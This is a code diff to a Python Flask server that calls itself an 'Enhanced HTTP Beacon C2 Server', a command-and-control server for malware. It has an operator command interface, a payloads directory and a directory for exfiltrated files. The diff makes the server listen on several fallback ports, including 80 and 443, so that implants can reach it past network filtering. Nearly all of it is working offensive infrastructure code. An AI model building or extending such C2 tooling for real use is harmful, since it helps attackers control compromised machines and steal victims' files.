@@ -138,6 +138,14 @@ def download_file(filename):
         
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+    
+def run_server_on_port(port):
+    """Run Flask server on specific port"""
+    try:
+        print(f"[*] Starting listener on port {port}")
+        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
+    except Exception as e:
+        print(f"[!] Failed to start on port {port}: {e}")
 
 def operator_interface():
     """Run operator command interface in separate thread"""
@@ -297,17 +305,36 @@ def operator_interface():
             print(f"[ERROR] {str(e)}\n")
 
 if __name__ == '__main__':
+    # List of ports to listen on
+    PORTS = [8080, 8000, 8443, 9090, 443, 80]
+
     print("\n" + "="*60)
     print("Starting Enhanced HTTP Beacon C2 Server")
     print("="*60)
-    print(f"Listening on: http://0.0.0.0:8080")
     print(f"Exfiltrated files: {EXFIL_DIR}/")
     print(f"Payloads directory: {PAYLOADS_DIR}/")
+    print("="*60)
+    print(f"Attempting to bind to ports: {PORTS}")
     print("="*60)
     
     # Start operator interface in separate thread
     interface_thread = threading.Thread(target=operator_interface, daemon=True)
     interface_thread.start()
+
+    # Start Flask servers on multiple ports (all except the first)
+    threads = []
+    for port in PORTS[1:]:  # Skip first port, we'll run it in main thread
+        t = threading.Thread(target=run_server_on_port, args=(port,), daemon=True)
+        t.start()
+        threads.append(t)
+    
+    # Run first port in main thread (so Ctrl+C works)
+    print(f"\n[*] Primary C2 listening on port {PORTS[0]}")
+    print(f"[*] Fallback ports: {PORTS[1:]}\n")
     
     # Run Flask server (debug=False for cleaner output)
-    app.run(host='0.0.0.0', port=8080, debug=False)
+    try:
+        app.run(host='0.0.0.0', port=PORTS[0], debug=False)
+    except KeyboardInterrupt:
+        print("\n[*] Shutting down C2 server...")
+        sys.exit(0)
